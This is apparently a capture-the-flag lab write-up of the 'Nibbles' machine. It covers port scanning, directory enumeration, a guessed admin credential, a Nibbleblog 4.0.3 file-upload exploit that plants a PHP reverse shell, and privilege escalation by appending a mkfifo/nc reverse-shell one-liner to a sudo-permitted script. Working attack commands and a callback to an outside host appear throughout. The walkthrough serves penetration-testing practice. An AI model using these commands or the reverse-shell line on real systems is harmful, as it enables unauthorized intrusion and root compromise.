```bash
ghost@localhost [06:21:18] [~/Documents/hacking/tj-null-boxes/nibbles] [master]
-> % export IP=10.10.10.75
```

# Scan results
```bash
ghost@localhost [06:23:21] [~/Documents/hacking/tj-null-boxes/nibbles] [master]
-> % rustscan -a $IP -- -sC -sV
Open 10.10.10.75:22
Open 10.10.10.75:80
```

## Port 80 /
```bash
ghost@localhost [06:26:55] [~/Documents/hacking/tj-null-boxes/nibbles] [master]
-> % curl -vvv http://$IP
*   Trying 10.10.10.75:80...
* Connected to 10.10.10.75 (10.10.10.75) port 80 (#0)
> GET / HTTP/1.1
> Host: 10.10.10.75
> User-Agent: curl/7.85.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Tue, 20 Sep 2022 22:27:05 GMT
< Server: Apache/2.4.18 (Ubuntu)
< Last-Modified: Thu, 28 Dec 2017 20:19:50 GMT
< ETag: "5d-5616c3cf7fa77"
< Accept-Ranges: bytes
< Content-Length: 93
< Vary: Accept-Encoding
< Content-Type: text/html
<
<b>Hello world!</b>
<!-- /nibbleblog/ directory. Nothing interesting here! -->
* Connection #0 to host 10.10.10.75 left intact
```

## Port 80 /nibbleblog
Running gobuster gives out some results.
```bash
ghost@localhost [06:28:25] [~/Documents/hacking/tj-null-boxes/nibbles] [master]
-> % gobuster dir -u http://$IP/nibbleblog -k -w /usr/share/dirb/wordlists/common.txt
/.hta                 (Status: 403) [Size: 301]
/.htaccess            (Status: 403) [Size: 306]
/.htpasswd            (Status: 403) [Size: 306]
/admin                (Status: 301) [Size: 321] [--> http://10.10.10.75/nibbleblog/admin/]
/admin.php            (Status: 200) [Size: 1401]
/content              (Status: 301) [Size: 323] [--> http://10.10.10.75/nibbleblog/content/]
/index.php            (Status: 200) [Size: 2987]
/languages            (Status: 301) [Size: 325] [--> http://10.10.10.75/nibbleblog/languages/]
/plugins              (Status: 301) [Size: 323] [--> http://10.10.10.75/nibbleblog/plugins/]
/README               (Status: 200) [Size: 4628]
/themes               (Status: 301) [Size: 322] [--> http://10.10.10.75/nibbleblog/themes/]
```

Found an admin page at http://10.10.10.75/nibbleblog/admin.php.

It appears that the website is running the open source nibbleblog platform (https://www.nibbleblog.com/). README shows that it is running version 4.0.3.

Searchsploit result shows there's a file upload vulnerability.

```bash
ghost@localhost [06:34:25] [~/Documents/hacking/tj-null-boxes/nibbles] [master]
-> % searchsploit nibbleblog
--------------------------------------------------------- ---------------------------------
 Exploit Title                                           |  Path
--------------------------------------------------------- ---------------------------------
Nibbleblog 3 - Multiple SQL Injections                   | php/webapps/35865.txt
Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)    | php/remote/38489.rb
--------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

Found an exploit without using metasploit (https://github.com/dix0nym/CVE-2015-6967/blob/main/exploit.py). However, we need a credential, after some manual guesses, I manage to login with the following credential.

`admin:nibbles`

Therefore, with an exploit above, I upload the following PHP reverse shell payload (https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php).

```bash
ghost@localhost [07:03:38] [~/Documents/hacking/tj-null-boxes/nibbles] [master *]
-> % python3 exploit.py --url http://$IP/nibbleblog/ --username admin --password nibbles --payload shell.php
[+] Login Successful.
[+] Upload likely successfull.
```

```bash
ghost@localhost [07:02:44] [~/Documents/hacking/tj-null-boxes/nibbles] [master *]
-> % nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.8] from (UNKNOWN) [10.10.10.75] 34926
Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 19:03:47 up 6 min,  0 users,  load average: 0.00, 0.05, 0.03
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```

## user.txt

```bash
nibbler@Nibbles:/$ cd ~

nibbler@Nibbles:/home/nibbler$ cat user.txt
31fa0***
```

## Privilege Escalation

From linpeas, I found this following interesting script that can be run without sudo password.

```bash
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

Since I have write access to the file, I add the following reverse shell command at the end of the file.

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.8 4445 > /tmp/f" >> monitor.sh
```

Then with another reverse shell listener running, the script is executed as sudo as below

```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh
<er/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh
'unknown': I need something more specific.
/home/nibbler/personal/stuff/monitor.sh: 26: /home/nibbler/personal/stuff/monitor.sh: [[: not found
/home/nibbler/personal/stuff/monitor.sh: 36: /home/nibbler/personal/stuff/monitor.sh: [[: not found
/home/nibbler/personal/stuff/monitor.sh: 43: /home/nibbler/personal/stuff/monitor.sh: [[: not found
```

Then in the revere shell, we receives sudo shell.

```bash
ghost@localhost [07:33:56] [~/Documents/tools/peas]
-> % nc -lvnp 4445
listening on [any] 4445 ...
connect to [10.10.16.8] from (UNKNOWN) [10.10.10.75] 53086
# id
uid=0(root) gid=0(root) groups=0(root)

# cd ~

# ls
root.txt

# cat root.txt
b809c***
```
